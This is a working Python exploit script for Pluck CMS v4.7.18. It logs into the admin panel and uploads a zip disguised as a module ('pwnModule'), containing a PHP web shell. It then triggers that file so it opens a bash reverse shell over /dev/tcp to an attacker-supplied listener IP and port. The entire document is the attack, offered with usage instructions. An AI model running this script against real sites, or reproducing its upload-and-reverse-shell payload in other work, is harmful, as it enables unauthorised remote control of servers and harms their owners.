import requests, sys, os, zipfile, io

# Arbitrary Code Execution in Pluck CMS v4.7.18

# Checks for arguments.
if len(sys.argv) < 5:
    print("[-] Arguments required!")
    print(f'[!] Command: python3 {sys.argv[0]} <DOMAIN/IP> <PASSWORD> <IP_LISTENER> <PORT_LISTENER>')
    print(f"[!] es. python3 {sys.argv[0]} \"example.com\" \"Password1234!\" 10.10.10.10 5555")
    exit()

# Global variables
domain   = sys.argv[1]
password = sys.argv[2]
ip       = sys.argv[3]
port     = sys.argv[4]
moduleName = "pwnModule"
fileName   = "shell.php"
payload    = f"<?php echo system(\"/bin/bash -c 'bash -i>&/dev/tcp/{ip}/{port} 0>&1';\");?>"
url_login   = f"http://{domain}/login.php"
url_upload  = f"http://{domain}/admin.php?action=installmodule"
url_command = f"http://{domain}/data/modules/{moduleName}/{fileName}"

s = requests.Session()

# Login
print("[!] Login...")
dataLogin = { "cont1"  : password,
              "bogus"  : "",
              "submit" : "Log+in" }
if "Password incorrect" in s.post(url_login, data=dataLogin).text:
    print("[-] Password incorrect!")
else:
    print("[+] Password correct!")

# Create file for exploit
with zipfile.ZipFile(moduleName + ".zip", 'w', zipfile.ZIP_DEFLATED) as file_zip:
    php_file = io.BytesIO(payload.encode('utf-8'))
    file_zip.writestr(fileName, php_file.getvalue())
    print(f"[+] Created {moduleName}.zip file for exploit")

# Upload exploit
print("[!] Uploading the zip file...")
with open(moduleName + ".zip", "rb") as file_zip:
    filesUpload = {"sendfile": file_zip }
    dataUpload  = { "submit": "Upload" }

    upload_response = s.post(url_upload, files=filesUpload, data=dataUpload)

    # Check if upload was successful
    if upload_response.status_code == 200:
        print("[+] ZIP file uploaded successfully.")
    else:
        print("[-] ZIP file upload error. Response code:", upload_response.status_code)

# Reverse Shell
try:
    s.get(url_command, timeout=5)
except:
    print("[+] Reverse shell triggered!")
  
# Clear
os.remove(moduleName + ".zip")
print("[+] Deleted local zip file")

print("[!] Done, bye!")
